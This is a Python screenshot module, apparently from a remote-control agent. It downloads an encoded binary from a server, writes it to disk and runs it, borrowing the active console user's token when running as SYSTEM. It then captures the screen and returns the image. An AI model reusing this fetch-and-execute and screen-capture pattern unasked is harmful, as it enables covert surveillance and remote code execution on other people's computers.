# -*- coding: utf8 -*-
'''
截图模块
'''
from ctypes import windll
from win32ts import WTSQueryUserToken
from win32con import NORMAL_PRIORITY_CLASS
from win32process import CreateProcessAsUser, STARTUPINFO
from base64 import b85decode, b64decode
from time import sleep
import sys
import ComMod, Shell
import os
from random import randint
import requests


def run_as_active_session_user(process, args):
    session_id = windll.kernel32.WTSGetActiveConsoleSessionId()
    token = WTSQueryUserToken(session_id)
    CreateProcessAsUser(token, process, args, None, None, True, NORMAL_PRIORITY_CLASS, None, None, STARTUPINFO())


def sc(host):
    try:
        install_path = '\\'.join(sys.argv[0].split('\\')[:-1])
        cp_name = "sc.tmp"
        cp_path = install_path + "\\" + cp_name
        filename = install_path + r"\{}.png".format(randint(0, 99999))
        if os.path.exists(cp_path) == False:
            with open(cp_path, 'wb') as f:
                cp = requests.get(host + '/s.txt').text.encode("utf-8", "ignore")
                a = b85decode(cp)
                f.write(a)
        whoami = Shell.shell_exec('whoami')
        if whoami.find('system') > -1:
            run_as_active_session_user(cp_path, '{} -o {}'.format(cp_name, filename))
        else:
            Shell.shell_exec('{} -o {}'.format(cp_path, filename))
        sleep(1)
        with open(filename, 'rb') as ff:
            result = ff.read()
        os.remove(filename)
        return result
    except Exception as e:
        ComMod.Log("ScreenShot: 截图异常 " + str(e))
        return b64decode(
            "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")
